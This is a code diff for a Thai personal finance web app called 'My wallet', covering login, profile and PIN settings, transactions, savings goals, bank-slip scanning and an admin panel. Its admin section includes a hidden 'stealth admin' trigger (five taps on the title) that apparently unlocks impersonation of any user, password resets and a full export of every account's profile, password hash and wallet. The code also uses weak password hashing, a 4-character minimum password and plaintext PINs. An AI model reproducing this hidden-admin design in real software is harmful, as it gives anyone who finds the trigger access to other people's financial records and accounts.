+            closeModalById('authModal');
+            showToast(`เข้าสู่ระบบด้วย ${provider} เรียบร้อยแล้ว`, '✅');
+        };
+
+        async function completeLoginSession(profileObj, walletObj, rememberMe = true) {
+            appState.isLoggedIn = true;
+            appState.isImpersonating = false;
+            appState.currentUser = profileObj;
+            appState.userData = { ...createEmptyWalletData(), ...walletObj };
+
+            if (rememberMe) {
+                await dualSave(FIXED_KEYS.ACTIVE_USER, profileObj.email);
+            } else {
+                try { window.localStorage.removeItem(FIXED_KEYS.ACTIVE_USER); } catch (e) {}
+                await idbDelete(FIXED_KEYS.ACTIVE_USER);
+            }
+
+            if (firestoreDbInstance && profileObj.email !== 'admin') {
+                await startActiveUserRealtimeListener(profileObj.email);
+            }
+
+            updateHeaderAndLockUI();
+            renderFullDashboard();
+        }
+
+        window.handleHeaderAuthButtonClick = async function () {
+            if (appState.isLoggedIn) {
+                if (typeof unsubscribeActiveUserListener === 'function') {
+                    try { unsubscribeActiveUserListener(); } catch (e) {}
+                    unsubscribeActiveUserListener = null;
+                }
+                appState.isLoggedIn = false;
+                appState.currentUser = null;
+                appState.userData = createEmptyWalletData();
+                appState.isStealthAdmin = false;
+                appState.isImpersonating = false;
+                try { window.localStorage.removeItem(FIXED_KEYS.ACTIVE_USER); } catch (e) {}
+                await idbDelete(FIXED_KEYS.ACTIVE_USER);
+
+                updateHeaderAndLockUI();
+                renderFullDashboard();
+                showToast('ออกจากระบบเรียบร้อยแล้ว ข้อมูลถูกบันทึกอย่างปลอดภัย', '🔒');
+            } else {
+                openAuthModal('login');
+            }
+        };
+
+        window.handleAvatarClick = function () {
+            if (!appState.isLoggedIn) {
+                openAuthModal('login');
+            } else {
+                openProfileModal();
+            }
+        };
+
+        window.toggleAuthPasswordField = function () {
+            const inp = document.getElementById('authPasswordInput');
+            inp.type = inp.type === 'password' ? 'text' : 'password';
+        };
+
+        window.updatePasswordStrengthMeter = function (pw) {
+            const label = document.getElementById('passwordStrengthLabel');
+            const bar = document.getElementById('passwordStrengthBar');
+            if (!pw) {
+                label.textContent = '-';
+                bar.style.width = '0%';
+                return;
+            }
+            let score = 0;
+            if (pw.length >= 4) score += 25;
+            if (pw.length >= 8) score += 25;
+            if (/[A-Z]/.test(pw) || /[0-9]/.test(pw)) score += 25;
+            if (/[^A-Za-z0-9]/.test(pw)) score += 25;
+
+            bar.style.width = score + '%';
+            if (score <= 25) {
+                label.textContent = 'อ่อน';
+                label.className = 'font-semibold text-rose-400';
+                bar.className = 'h-full transition-all duration-300 bg-rose-500';
+            } else if (score <= 75) {
+                label.textContent = 'ปานกลาง';
+                label.className = 'font-semibold text-amber-400';
+                bar.className = 'h-full transition-all duration-300 bg-amber-500';
+            } else {
+                label.textContent = 'แข็งแกร่งมาก';
+                label.className = 'font-semibold text-emerald-400';
+                bar.className = 'h-full transition-all duration-300 bg-emerald-500';
+            }
+        };
+
+        // =========================================================================
+        // 5. PROFILE SETTINGS, PIN LOCK & JSON BACKUP
+        // =========================================================================
+        window.openProfileModal = function () {
+            if (!appState.isLoggedIn || !appState.currentUser) {
+                openAuthModal('login');
+                return;
+            }
+            document.getElementById('profileDisplayNameInput').value = appState.currentUser.displayName || '';
+            document.getElementById('profileNewPasswordInput').value = '';
+            document.getElementById('profilePinInput').value = appState.currentUser.pinCode || '';
+            const removePinBtn = document.getElementById('removePinBtn');
+            if (appState.currentUser.pinCode) {
+                removePinBtn.classList.remove('hidden');
+            } else {
+                removePinBtn.classList.add('hidden');
+            }
+            openModalById('profileModal');
+        };
+
+        window.handleProfileSave = async function (e) {
+            e.preventDefault();
+            if (!appState.isLoggedIn || !appState.currentUser) return;
+
+            const newDisplay = document.getElementById('profileDisplayNameInput').value.trim();
+            const newPw = document.getElementById('profileNewPasswordInput').value;
+            const newPin = document.getElementById('profilePinInput').value.trim();
+            const avatarFile = document.getElementById('profileAvatarFileInput').files?.[0];
+
+            if (newDisplay) appState.currentUser.displayName = newDisplay;
+            if (newPw) {
+                if (newPw.length < 4) {
+                    showToast('รหัสผ่านใหม่ต้องมีอย่างน้อย 4 ตัวอักษร', '⚠️');
+                    return;
+                }
+                appState.currentUser.passwordHash = hashPasswordSimple(newPw);
+            }
+            if (newPin) {
+                if (!/^\d{6}$/.test(newPin)) {
+                    showToast('รหัส PIN ต้องเป็นตัวเลข 6 หลักเท่านั้น', '⚠️');
+                    return;
+                }
+                appState.currentUser.pinCode = newPin;
+            }
+            if (avatarFile) {
+                const resized = await resizeImageFileToDataUrl(avatarFile, 160);
+                if (resized) appState.currentUser.avatarDataUrl = resized;
+            }
+
+            appState.currentUser.updatedAt = new Date().toISOString();
+            appState.usersRegistry[appState.currentUser.email] = appState.currentUser;
+            await dualSave(FIXED_KEYS.USERS_REGISTRY, appState.usersRegistry);
+
+            if (firestoreDbInstance && appState.currentUser.email !== 'admin') {
+                await pushUserDocumentToCloud(appState.currentUser.email, appState.currentUser, appState.userData);
+            }
+
+            closeModalById('profileModal');
+            updateHeaderAndLockUI();
+            showToast('บันทึกการตั้งค่าโปรไฟล์เรียบร้อยแล้ว', '✅');
+        };
+
+        window.removeAccountPin = async function () {
+            if (!appState.currentUser) return;
+            appState.currentUser.pinCode = '';
+            appState.currentUser.updatedAt = new Date().toISOString();
+            appState.usersRegistry[appState.currentUser.email] = appState.currentUser;
+            await dualSave(FIXED_KEYS.USERS_REGISTRY, appState.usersRegistry);
+            document.getElementById('profilePinInput').value = '';
+            document.getElementById('removePinBtn').classList.add('hidden');
+            updateHeaderAndLockUI();
+            showToast('ลบรหัสล็อกหน้าจอ PIN แล้ว', '🔓');
+        };
+
+        window.activatePinLockScreen = function () {
+            if (!appState.currentUser || !appState.currentUser.pinCode) return;
+            document.getElementById('pinLockAccountLabel').textContent = `บัญชี: ${appState.currentUser.displayName}`;
+            document.getElementById('pinUnlockInputField').value = '';
+            openModalById('pinLockScreenOverlay');
+        };
+
+        window.appendPinDigit = function (d) {
+            const inp = document.getElementById('pinUnlockInputField');
+            if (inp.value.length < 6) {
+                inp.value += d;
+                handlePinInputCheck(inp.value);
+            }
+        };
+
+        window.clearPinDigits = function () {
+            document.getElementById('pinUnlockInputField').value = '';
+        };
+
+        window.backspacePinDigit = function () {
+            const inp = document.getElementById('pinUnlockInputField');
+            inp.value = inp.value.slice(0, -1);
+        };
+
+        window.handlePinInputCheck = function (val) {
+            if (!appState.currentUser || !appState.currentUser.pinCode) {
+                closeModalById('pinLockScreenOverlay');
+                return;
+            }
+            if (val.length === 6) {
+                if (val === appState.currentUser.pinCode) {
+                    closeModalById('pinLockScreenOverlay');
+                    showToast('ปลดล็อก PIN สำเร็จ', '🔓');
+                } else {
+                    document.getElementById('pinUnlockInputField').value = '';
+                    showToast('รหัส PIN ไม่ถูกต้อง กรุณาลองใหม่', '❌');
+                }
+            }
+        };
+
+        window.logoutFromPinScreen = async function () {
+            closeModalById('pinLockScreenOverlay');
+            await handleHeaderAuthButtonClick();
+        };
+
+        window.exportFullJsonBackup = function () {
+            if (!appState.isLoggedIn || !appState.currentUser) return;
+            const payload = {
+                app: 'My wallet',
+                exportedAt: new Date().toISOString(),
+                profile: appState.currentUser,
+                walletData: appState.userData
+            };
+            const blob = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `mywallet-backup-${appState.currentUser.email}-${new Date().toISOString().slice(0, 10)}.json`;
+            a.click();
+            URL.revokeObjectURL(url);
+            showToast('ดาวน์โหลดไฟล์สำรอง .json เรียบร้อยแล้ว', '📤');
+        };
+
+        window.importFullJsonBackup = function (e) {
+            const file = e.target.files?.[0];
+            if (!file || !appState.isLoggedIn || !appState.currentUser) return;
+            const reader = new FileReader();
+            reader.onload = async (ev) => {
+                try {
+                    const parsed = JSON.parse(ev.target.result);
+                    if (!parsed || !parsed.walletData) throw new Error('Invalid format');
+                    appState.userData = mergeWalletDataNonDestructive(appState.userData, parsed.walletData);
+                    await saveActiveUserWallet();
+                    renderFullDashboard();
+                    closeModalById('profileModal');
+                    showToast('กู้คืนข้อมูลจากไฟล์สำรองสำเร็จ!', '📥');
+                } catch (err) {
+                    showToast('ไฟล์สำรองไม่ถูกต้อง กรุณาตรวจสอบไฟล์ .json', '⚠️');
+                }
+            };
+            reader.readAsText(file);
+            e.target.value = '';
+        };
+
+        // =========================================================================
+        // 6. TRANSACTIONS, 1-TAP PRESETS, BUDGET & SAVINGS GOALS
+        // =========================================================================
+        function populateCategoryDropdown(selectId, type, selectedVal = '') {
+            const sel = document.getElementById(selectId);
+            if (!sel) return;
+            const list = CATEGORIES[type] || CATEGORIES.expense;
+            sel.innerHTML = list.map(c => `<option value="${c.id}" ${c.id === selectedVal ? 'selected' : ''}>${c.label}</option>`).join('');
+        }
+
+        function getCategoryDisplayLabel(type, catId) {
+            const list = CATEGORIES[type] || [...CATEGORIES.expense, ...CATEGORIES.income];
+            const found = list.find(c => c.id === catId);
+            return found ? found.label : (type === 'income' ? '💰 รายรับ' : '💸 รายจ่าย');
+        }
+
+        window.setNewTxType = function (type) {
+            appState.newTxType = type;
+            const expBtn = document.getElementById('newTxTypeExpenseBtn');
+            const incBtn = document.getElementById('newTxTypeIncomeBtn');
+            if (type === 'expense') {
+                expBtn.className = 'py-2.5 rounded-xl text-xs font-semibold transition bg-rose-600 text-white shadow cursor-pointer';
+                incBtn.className = 'py-2.5 rounded-xl text-xs font-semibold transition text-slate-400 hover:text-white cursor-pointer';
+            } else {
+                incBtn.className = 'py-2.5 rounded-xl text-xs font-semibold transition bg-emerald-600 text-white shadow cursor-pointer';
+                expBtn.className = 'py-2.5 rounded-xl text-xs font-semibold transition text-slate-400 hover:text-white cursor-pointer';
+            }
+            populateCategoryDropdown('newTxCategory', type);
+        };
+
+        window.handleCreateTransaction = async function (e) {
+            e.preventDefault();
+            if (!appState.isLoggedIn) {
+                openAuthModal('login');
+                return;
+            }
+            const amount = parseFloat(document.getElementById('newTxAmount').value);
+            const dateVal = document.getElementById('newTxDate').value || new Date().toISOString().slice(0, 10);
+            const category = document.getElementById('newTxCategory').value;
+            const noteRaw = document.getElementById('newTxNote').value.trim();
+
+            if (isNaN(amount) || amount <= 0) {
+                showToast('กรุณากรอกจำนวนเงินที่มากกว่า 0', '⚠️');
+                return;
+            }
+
+            const txObj = {
+                id: 'tx_' + Date.now() + '_' + Math.random().toString(36).slice(2, 7),
+                type: appState.newTxType,
+                amount,
+                date: dateVal,
+                category,
+                note: noteRaw || getCategoryDisplayLabel(appState.newTxType, category).replace(/^[^\s]+\s/, ''),
+                createdAt: Date.now(),
+                updatedAt: new Date().toISOString()
+            };
+
+            appState.userData.transactions.unshift(txObj);
+            await saveActiveUserWallet();
+
+            document.getElementById('newTxAmount').value = '';
+            document.getElementById('newTxNote').value = '';
+            renderFullDashboard();
+            showToast(`บันทึก${txObj.type === 'income' ? 'รายรับ' : 'รายจ่าย'} ฿${formatCurrency(amount)} เรียบร้อย`, '✅');
+        };
+
+        window.openEditTransactionModal = function (txId) {
+            if (!appState.isLoggedIn) return;
+            const tx = appState.userData.transactions.find(t => t.id === txId);
+            if (!tx) return;
+
+            document.getElementById('editTxIdField').value = tx.id;
+            setEditTxModalType(tx.type, tx.category);
+            document.getElementById('editTxAmountField').value = tx.amount;
+            document.getElementById('editTxDateField').value = tx.date;
+            document.getElementById('editTxNoteField').value = tx.note;
+            openModalById('editTxModal');
+        };
+
+        window.setEditTxModalType = function (type, selectedCat = '') {
+            appState.editTxType = type;
+            const expBtn = document.getElementById('editTxTypeExpenseBtn');
+            const incBtn = document.getElementById('editTxTypeIncomeBtn');
+            if (type === 'expense') {
+                expBtn.className = 'py-2 rounded-xl text-xs font-semibold bg-rose-600 text-white shadow cursor-pointer';
+                incBtn.className = 'py-2 rounded-xl text-xs font-semibold text-slate-400 cursor-pointer';
+            } else {
+                incBtn.className = 'py-2 rounded-xl text-xs font-semibold bg-emerald-600 text-white shadow cursor-pointer';
+                expBtn.className = 'py-2 rounded-xl text-xs font-semibold text-slate-400 cursor-pointer';
+            }
+            populateCategoryDropdown('editTxCategoryField', type, selectedCat);
+        };
+
+        window.handleEditTransactionSave = async function (e) {
+            e.preventDefault();
+            const txId = document.getElementById('editTxIdField').value;
+            const idx = appState.userData.transactions.findIndex(t => t.id === txId);
+            if (idx === -1) return;
+
+            const amount = parseFloat(document.getElementById('editTxAmountField').value);
+            const dateVal = document.getElementById('editTxDateField').value;
+            const category = document.getElementById('editTxCategoryField').value;
+            const note = document.getElementById('editTxNoteField').value.trim();
+
+            if (isNaN(amount) || amount <= 0) {
+                showToast('กรุณากรอกจำนวนเงินที่ถูกต้อง', '⚠️');
+                return;
+            }
+
+            appState.userData.transactions[idx] = {
+                ...appState.userData.transactions[idx],
+                type: appState.editTxType,
+                amount,
+                date: dateVal || appState.userData.transactions[idx].date,
+                category,
+                note: note || appState.userData.transactions[idx].note,
+                updatedAt: new Date().toISOString()
+            };
+
+            await saveActiveUserWallet();
+            closeModalById('editTxModal');
+            renderFullDashboard();
+            showToast('แก้ไขรายการเรียบร้อยแล้ว', '✏️');
+        };
+
+        window.triggerQuickAddPreset = async function (presetId) {
+            if (!appState.isLoggedIn) {
+                openAuthModal('login');
+                return;
+            }
+            const preset = (appState.userData.quickButtons || []).find(b => b.id === presetId);
+            if (!preset) return;
+
+            const txObj = {
+                id: 'tx_' + Date.now() + '_' + Math.random().toString(36).slice(2, 7),
+                type: preset.type || 'expense',
+                amount: Number(preset.amount),
+                date: new Date().toISOString().slice(0, 10),
+                category: preset.category || 'food',
+                note: `${preset.emoji} ${preset.label}`,
+                createdAt: Date.now(),
+                updatedAt: new Date().toISOString()
+            };
+
+            appState.userData.transactions.unshift(txObj);
+            await saveActiveUserWallet();
+            renderFullDashboard();
+            showToast(`บันทึกด่วน "${preset.label}" ฿${formatCurrency(preset.amount)} แล้ว`, '⚡');
+        };
+
+        window.openCustomQuickAddModal = function () {
+            if (!appState.isLoggedIn) {
+                openAuthModal('login');
+                return;
+            }
+            populateQuickBtnCategories();
+            openModalById('customQuickAddModal');
+        };
+
+        window.populateQuickBtnCategories = function () {
+            const type = document.getElementById('quickBtnTypeSelect').value;
+            populateCategoryDropdown('quickBtnCategorySelect', type);
+        };
+
+        window.handleAddCustomQuickButton = async function (e) {
+            e.preventDefault();
+            if (!appState.isLoggedIn) return;
+            const emoji = document.getElementById('quickBtnEmojiInput').value.trim() || '⚡';
+            const label = document.getElementById('quickBtnLabelInput').value.trim();
+            const amount = parseFloat(document.getElementById('quickBtnAmountInput').value);
+            const type = document.getElementById('quickBtnTypeSelect').value;
+            const category = document.getElementById('quickBtnCategorySelect').value;
+
+            if (!label || isNaN(amount) || amount <= 0) {
+                showToast('กรุณากรอกชื่อปุ่มและจำนวนเงินให้ถูกต้อง', '⚠️');
+                return;
+            }
+
+            if (!Array.isArray(appState.userData.quickButtons)) {
+                appState.userData.quickButtons = [...DEFAULT_QUICK_BUTTONS];
+            }
+            appState.userData.quickButtons.push({
+                id: 'qb_' + Date.now(),
+                emoji,
+                label,
+                amount,
+                type,
+                category
+            });
+
+            await saveActiveUserWallet();
+            closeModalById('customQuickAddModal');
+            e.target.reset();
+            document.getElementById('quickBtnEmojiInput').value = '🍜';
+            renderFullDashboard();
+            showToast(`เพิ่มปุ่มด่วน "${label}" เรียบร้อยแล้ว`, '⚡');
+        };
+
+        window.deleteQuickAddPreset = async function (e, presetId) {
+            e.stopPropagation();
+            if (!appState.isLoggedIn) return;
+            appState.userData.quickButtons = (appState.userData.quickButtons || []).filter(b => b.id !== presetId);
+            await saveActiveUserWallet();
+            renderFullDashboard();
+            showToast('ลบปุ่มลัดแล้ว', '🗑️');
+        };
+
+        window.openBudgetModal = function () {
+            if (!appState.isLoggedIn) {
+                openAuthModal('login');
+                return;
+            }
+            document.getElementById('budgetLimitInput').value = appState.userData.budgetLimit || '';
+            openModalById('budgetModal');
+        };
+
+        window.saveBudgetLimit = async function () {
+            if (!appState.isLoggedIn) return;
+            const val = parseFloat(document.getElementById('budgetLimitInput').value) || 0;
+            appState.userData.budgetLimit = Math.max(0, val);
+            await saveActiveUserWallet();
+            closeModalById('budgetModal');
+            renderFullDashboard();
+            showToast(val > 0 ? `ตั้งงบประมาณรายเดือน ฿${formatCurrency(val)} แล้ว` : 'ยกเลิกวงเงินงบประมาณแล้ว', '🎯');
+        };
+
+        window.openCreateGoalModal = function () {
+            if (!appState.isLoggedIn) {
+                openAuthModal('login');
+                return;
+            }
+            openModalById('createGoalModal');
+        };
+
+        window.handleCreateGoal = async function (e) {
+            e.preventDefault();
+            if (!appState.isLoggedIn) return;
+            const name = document.getElementById('newGoalNameInput').value.trim();
+            const target = parseFloat(document.getElementById('newGoalTargetInput').value);
+            const initial = parseFloat(document.getElementById('newGoalInitialInput').value) || 0;
+
+            if (!name || isNaN(target) || target <= 0) {
+                showToast('กรุณากรอกชื่อเป้าหมายและจำนวนเงินเป้าหมายให้ถูกต้อง', '⚠️');
+                return;
+            }
+
+            if (!Array.isArray(appState.userData.savingsGoals)) {
+                appState.userData.savingsGoals = [];
+            }
+            appState.userData.savingsGoals.push({
+                id: 'goal_' + Date.now(),
+                name,
+                targetAmount: target,
+                savedAmount: Math.max(0, initial),
+                createdAt: new Date().toISOString(),
+                updatedAt: new Date().toISOString()
+            });
+
+            await saveActiveUserWallet();
+            closeModalById('createGoalModal');
+            e.target.reset();
+            renderFullDashboard();
+            showToast(`สร้างเป้าหมาย "${name}" สำเร็จ!`, '🏆');
+        };
+
+        window.depositToSavingsGoal = async function (goalId) {
+            if (!appState.isLoggedIn) return;
+            const goal = (appState.userData.savingsGoals || []).find(g => g.id === goalId);
+            if (!goal) return;
+            const addAmt = Math.min(500, Math.max(100, Math.round(goal.targetAmount * 0.1)));
+            goal.savedAmount = Number(goal.savedAmount || 0) + addAmt;
+            goal.updatedAt = new Date().toISOString();
+            await saveActiveUserWallet();
+            renderFullDashboard();
+            showToast(`หยอดกระปุก "${goal.name}" +฿${formatCurrency(addAmt)}`, '🪙');
+        };
+
+        window.deleteSavingsGoal = async function (goalId) {
+            if (!appState.isLoggedIn) return;
+            appState.userData.savingsGoals = (appState.userData.savingsGoals || []).filter(g => g.id !== goalId);
+            await saveActiveUserWallet();
+            renderFullDashboard();
+            showToast('ลบเป้าหมายการออมแล้ว', '🗑️');
+        };
+
+        // =========================================================================
+        // 7. REAL BANK SLIP & PROMPTPAY QR SCANNER (jsQR + Tesseract.js)
+        // =========================================================================
+        window.setSlipVerifyType = function (type) {
+            appState.slipVerifyType = type;
+            const expBtn = document.getElementById('slipTxTypeExpenseBtn');
+            const incBtn = document.getElementById('slipTxTypeIncomeBtn');
+            if (type === 'expense') {
+                expBtn.className = 'py-2 rounded-lg text-xs font-semibold bg-rose-600 text-white shadow cursor-pointer';
+                incBtn.className = 'py-2 rounded-lg text-xs font-semibold text-slate-400 cursor-pointer';
+            } else {
+                incBtn.className = 'py-2 rounded-lg text-xs font-semibold bg-emerald-600 text-white shadow cursor-pointer';
+                expBtn.className = 'py-2 rounded-lg text-xs font-semibold text-slate-400 cursor-pointer';
+            }
+            populateCategoryDropdown('slipCategorySelect', type);
+        };
+
+        window.handleSlipImageUpload = function (e) {
+            const file = e.target.files?.[0];
+            if (!file) return;
+            if (!appState.isLoggedIn) {
+                openAuthModal('login');
+                return;
+            }
+
+            const reader = new FileReader();
+            reader.onload = async (ev) => {
+                const dataUrl = ev.target.result;
+                const thumbEl = document.getElementById('slipThumbPreview');
+                thumbEl.src = dataUrl;
+                thumbEl.classList.remove('hidden');
+
+                document.getElementById('slipAmountInput').value = '';
+                document.getElementById('slipNoteInput').value = 'สลิปโอนเงิน';
+                document.getElementById('slipRefIdDisplay').classList.add('hidden');
+                document.getElementById('slipDetectionStatusBadge').textContent = 'กำลังสแกน QR & OCR...';
+                document.getElementById('slipDetectionDetailText').textContent = 'กำลังอ่านรหัส QR และตัวเลขบนสลิป...';
+                document.getElementById('slipScanProgressBar').style.width = '30%';
+                setSlipVerifyType('expense');
+                openModalById('slipVerificationModal');
+
+                const img = new Image();
+                img.onload = async () => {
+                    let detectedAmount = null;
+                    let refCode = '';
+
+                    // Step A: Attempt jsQR scan
+                    try {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = img.width;
+                        canvas.height = img.height;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(img, 0, 0);
+                        const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+                        if (window.jsQR) {
+                            const qr = window.jsQR(imgData.data, imgData.width, imgData.height);
+                            if (qr && qr.data) {
+                                refCode = qr.data.slice(0, 28);
+                                const amtTag = qr.data.match(/54\d{2}(\d+\.\d{2})/);
+                                if (amtTag && amtTag[1]) detectedAmount = parseFloat(amtTag[1]);
+                            }
+                        }
+                    } catch (err) {}
+
+                    document.getElementById('slipScanProgressBar').style.width = '65%';
+
+                    // Step B: Tesseract OCR fallback for Thai bank slip amounts
+                    try {
+                        if (window.Tesseract) {
+                            const res = await window.Tesseract.recognize(dataUrl, 'eng+tha');
+                            const text = (res && res.data && res.data.text) ? res.data.text : '';
+                            const matches = [...text.matchAll(/(\d{1,3}(?:,\d{3})*\.\d{2})/g)]
+                                .map(m => parseFloat(m[1].replace(/,/g, '')))
+                                .filter(n => n > 0 && n < 10000000);
+                            if (matches.length > 0 && !detectedAmount) {
+                                detectedAmount = matches[0];
+                            }
+                        }
+                    } catch (err) {}
+
+                    document.getElementById('slipScanProgressBar').style.width = '100%';
+                    if (refCode) {
+                        const refEl = document.getElementById('slipRefIdDisplay');
+                        refEl.textContent = 'QR Ref: ' + refCode;
+                        refEl.classList.remove('hidden');
+                        document.getElementById('slipNoteInput').value = `สลิปโอนเงิน (Ref: ${refCode.slice(0, 14)})`;
+                    }
+
+                    if (detectedAmount && detectedAmount > 0) {
+                        document.getElementById('slipAmountInput').value = detectedAmount.toFixed(2);
+                        document.getElementById('slipDetectionStatusBadge').textContent = '✅ อ่านยอดเงินสำเร็จ';
+                        document.getElementById('slipDetectionDetailText').textContent = `ตรวจพบยอดเงิน ฿${formatCurrency(detectedAmount)} กรุณาตรวจสอบความถูกต้องก่อนบันทึก`;
+                    } else {
+                        document.getElementById('slipDetectionStatusBadge').textContent = '📝 กรุณาระบุยอดเงิน';
+                        document.getElementById('slipDetectionDetailText').textContent = 'สแกนรูปภาพเรียบร้อย กรุณากรอกยอดเงินที่ต้องการบันทึก';
+                    }
+                };
+                img.src = dataUrl;
+            };
+            reader.readAsDataURL(file);
+            e.target.value = '';
+        };
+
+        window.handleConfirmSlipSave = async function (e) {
+            e.preventDefault();
+            if (!appState.isLoggedIn) return;
+            const amount = parseFloat(document.getElementById('slipAmountInput').value);
+            const category = document.getElementById('slipCategorySelect').value;
+            const note = document.getElementById('slipNoteInput').value.trim() || 'สลิปโอนเงิน';
+
+            if (isNaN(amount) || amount <= 0) {
+                showToast('กรุณากรอกจำนวนเงินให้ถูกต้อง', '⚠️');
+                return;
+            }
+
+            appState.userData.transactions.unshift({
+                id: 'tx_' + Date.now() + '_' + Math.random().toString(36).slice(2, 7),
+                type: appState.slipVerifyType,
+                amount,
+                date: new Date().toISOString().slice(0, 10),
+                category,
+                note,
+                createdAt: Date.now(),
+                updatedAt: new Date().toISOString()
+            });
+
+            await saveActiveUserWallet();
+            closeModalById('slipVerificationModal');
+            renderFullDashboard();
+            showToast(`บันทึกรายการจากสลิป ฿${formatCurrency(amount)} เรียบร้อย`, '🧾');
+        };
+
+        // =========================================================================
+        // 8. ADMIN PANEL, STEALTH TRIGGER, IMPERSONATION & USER MANAGEMENT
+        // =========================================================================
+        window.handleStealthTitleTap = function () {
+            appState.stealthTapCount++;
+            clearTimeout(appState.stealthTapTimer);
+            appState.stealthTapTimer = setTimeout(() => {
+                appState.stealthTapCount = 0;
+            }, 1800);
+
+            if (appState.stealthTapCount >= 5) {
+                appState.stealthTapCount = 0;
+                appState.isStealthAdmin = true;
+                updateHeaderAndLockUI();
+                openAdminModal();
+                showToast('ปลดล็อก Stealth Admin Control Panel แล้ว', '🛡️');
+            }
+        };
+
+        window.openAdminModal = async function (focusCloud = false) {
+            if (!isCurrentSessionAdmin()) return;
+            const cfg = appState.firebaseConfig || DEFAULT_FIREBASE_CONFIG;
+            const ta = document.getElementById('firebaseConfigTextarea');
+            if (ta && cfg) {
+                ta.value = 'const firebaseConfig = ' + JSON.stringify(cfg, null, 2) + ';';
+            }
+            updateAdminCloudModalUI();
+            await renderAdminUsersList();
+            openModalById('adminControlModal');
+            if (focusCloud) {
+                const sec = document.getElementById('adminCloudConfigSection');
+                if (sec) sec.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+            }
+        };
+
+        // 1-Click Impersonate: Inspect & manage any user's wallet directly
+        window.impersonateUserAccount = async function (email) {
+            if (!isCurrentSessionAdmin() || !email || email === 'admin') return;
+            const profile = appState.usersRegistry[email];
+            if (!profile) {
+                showToast('ไม่พบบัญชีผู้ใช้นี้', '⚠️');
+                return;
+            }
+
+            let wallet = appState.adminUsersWalletCache[email] || await dualLoadWithRestore(FIXED_KEYS.USER_DATA_PREFIX + email);
+            if (firestoreDbInstance) {
+                try {
+                    const docId = sanitizeFirestoreDocId(email);
+                    const uSnap = await getDoc(doc(firestoreDbInstance, FIRESTORE_COLLECTION, docId));
+                    if (uSnap.exists() && uSnap.data().walletData) {
+                        wallet = mergeWalletDataNonDestructive(wallet, uSnap.data().walletData);
+                        appState.adminUsersWalletCache[email] = wallet;
+                        await dualSave(FIXED_KEYS.USER_DATA_PREFIX + email, wallet);
+                    }
+                } catch (err) {}
+            }
+
+            appState.isImpersonating = true;
+            appState.isLoggedIn = true;
+            appState.currentUser = profile;
+            appState.userData = { ...createEmptyWalletData(), ...(wallet || {}) };
+
+            if (firestoreDbInstance) {
+                await startActiveUserRealtimeListener(email);
+            }
+
+            closeModalById('adminControlModal');
+            updateHeaderAndLockUI();
+            renderFullDashboard();
+            showToast(`กำลังเข้าดูบัญชี: ${profile.displayName || email}`, '👁️');
+        };
+
+        window.exitImpersonationToAdmin = async function () {
+            if (typeof unsubscribeActiveUserListener === 'function') {
+                try { unsubscribeActiveUserListener(); } catch (e) {}
+                unsubscribeActiveUserListener = null;
+            }
+            appState.isImpersonating = false;
+
+            const savedActive = await dualLoadWithRestore(FIXED_KEYS.ACTIVE_USER);
+            if (savedActive === 'admin' && appState.usersRegistry['admin']) {
+                appState.isLoggedIn = true;
+                appState.currentUser = appState.usersRegistry['admin'];
+                appState.userData = createEmptyWalletData();
+            } else {
+                appState.isLoggedIn = false;
+                appState.currentUser = null;
+                appState.userData = createEmptyWalletData();
+                appState.isStealthAdmin = true;
+            }
+
+            updateHeaderAndLockUI();
+            renderFullDashboard();
+            await openAdminModal();
+            showToast('กลับสู่โหมดแอดมินเรียบร้อยแล้ว', '🛡️');
+        };
+
+        // Admin Change User Password Modal
+        window.openAdminChangePasswordModal = function (email) {
+            if (!isCurrentSessionAdmin() || !email) return;
+            const profile = appState.usersRegistry[email];
+            if (!profile) return;
+            document.getElementById('adminChangePwEmailField').value = email;
+            document.getElementById('adminChangePwTargetLabel').textContent = `บัญชี: ${profile.displayName || email} (${email})`;
+            document.getElementById('adminChangePwNewInput').value = '';
+            openModalById('adminChangePasswordModal');
+        };
+
+        window.toggleAdminNewPwField = function () {
+            const inp = document.getElementById('adminChangePwNewInput');
+            inp.type = inp.type === 'password' ? 'text' : 'password';
+        };
+
+        window.handleAdminSaveUserPassword = async function (e) {
+            e.preventDefault();
+            if (!isCurrentSessionAdmin()) return;
+            const email = document.getElementById('adminChangePwEmailField').value;
+            const newPw = document.getElementById('adminChangePwNewInput').value;
+
+            if (!newPw || newPw.length < 4) {
+                showToast('กรุณากรอกรหัสผ่านใหม่อย่างน้อย 4 ตัวอักษร', '⚠️');
+                return;
+            }
+
+            const profile = appState.usersRegistry[email];
+            if (!profile) return;
+
+            profile.passwordHash = hashPasswordSimple(newPw);
+            profile.updatedAt = new Date().toISOString();
+            appState.usersRegistry[email] = profile;
+
+            await dualSave(FIXED_KEYS.USERS_REGISTRY, appState.usersRegistry);
+            if (firestoreDbInstance) {
+                const wallet = appState.adminUsersWalletCache[email] || await dualLoadWithRestore(FIXED_KEYS.USER_DATA_PREFIX + email) || createEmptyWalletData();
+                await pushUserDocumentToCloud(email, profile, wallet);
+            }
+
+            closeModalById('adminChangePasswordModal');
+            await renderAdminUsersList();
+            showToast(`เปลี่ยนรหัสผ่านให้ "${profile.displayName || email}" เรียบร้อยแล้ว`, '🔑');
+        };
+
+        // Full System JSON Backup (All users + All wallets)
+        window.exportFullSystemBackupAdmin = async function () {
+            if (!isCurrentSessionAdmin()) return;
+            const emails = Object.keys(appState.usersRegistry);
+            const walletsMap = {};
+            for (const email of emails) {
+                if (email === 'admin') continue;
+                walletsMap[email] = appState.adminUsersWalletCache[email]
+                    || await dualLoadWithRestore(FIXED_KEYS.USER_DATA_PREFIX + email)
+                    || createEmptyWalletData();
+            }
+
+            const backupPayload = {
+                app: 'My wallet - Full System Backup',
+                projectId: (appState.firebaseConfig && appState.firebaseConfig.projectId) || 'my-wallet-62adf',
+                exportedAt: new Date().toISOString(),
+                totalMembers: Object.keys(walletsMap).length,
+                usersRegistry: appState.usersRegistry,
+                wallets: walletsMap
+            };
+
+            const blob = new Blob([JSON.stringify(backupPayload, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `mywallet-full-system-backup-${new Date().toISOString().slice(0, 10)}.json`;
+            a.click();
+            URL.revokeObjectURL(url);
